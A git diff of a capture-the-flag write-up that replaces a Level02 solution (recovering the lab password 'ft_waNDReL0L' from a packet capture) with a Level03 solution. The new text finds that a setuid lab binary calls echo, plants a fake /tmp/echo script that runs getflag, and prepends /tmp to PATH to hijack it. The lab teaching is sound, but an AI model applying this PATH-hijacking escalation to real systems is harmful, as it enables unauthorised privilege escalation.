@@ -1,33 +1,58 @@
-# Level02 Write-up
+# Level03 Write-up
 
 ## Objective:
 
-The goal of this level was to analyze network traffic and retrieve the password from a packet capture file.
+The goal of this level was to analyze an executable file and manipulate its behavior to retrieve the flag.
 
 ## Step-by-step process:
 
-### Step 1: Retrieving the `.pcap` File
+### Step 1: Retrieving the Executable
 
-To begin, I used `scp` to securely copy the `level02.pcap` file from the target system to my local machine:
-
-```bash
-scp -P 2222 level02@localhost:level02.pcap level02.pcap
-```
-
-This command specifies the port (-P 2222) and transfers the file level02.pcap from the remote user level02 to the local machine.
-
-### Step 2: Analyzing the Packet Capture with Wireshark
-
-Next, I opened the packet capture file in Wireshark for analysis:
+I started by using `scp` to securely transfer the `level03` executable from the remote system to my local machine for analysis:
 
 ```bash
-wireshark level02.pcap
+scp -P 2222 level03@localhost:level03 level03
 ```
 
-Within Wireshark, I looked for SSH authentication packets. By examining the packet stream, I was able to observe the hex bytes that corresponded to the keystrokes of the password.
+### Step 2: Analyzing the Executable with Ghidra
 
-### Step 3: Reconstructing the Password
+Next, I loaded the `level03` executable into _Ghidra_ for disassembly and analysis. Through this process, I discovered that the program calls the `echo` command.
 
-From the hex data, I reversed the captured password and identified the string:
+### Step 3: Exploiting the `echo` Call
 
-`ft_waNDReL0L`
+Since the program relies on the system's `echo` command, I decided to manipulate the `PATH` environment variable to make it use a custom script instead of the default `echo` command.
+
+To do this, I created a fake `echo` script in the `/tmp` directory by running the following in a text editor:
+
+```bash
+vim /tmp/echo
+```
+
+In the editor, I inserted the following shell script to replace the `echo` functionality with the `getflag` command:
+
+```bash
+#!/bin/sh
+getflag
+```
+
+Then, I made the script executable:
+
+```bash
+chmod +x /tmp/echo
+```
+
+### Step 4: Changing the `PATH` Variable
+
+After creating the fake `echo` script, I modified the `PATH` variable so that the program would use the `/tmp` directory first when calling `echo`:
+
+```bash
+export PATH="/tmp:$PATH"
+```
+
+### Step 5: Running the Program
+
+Finally, I executed the `level03` program:
+
+```bash
+./level03
+```
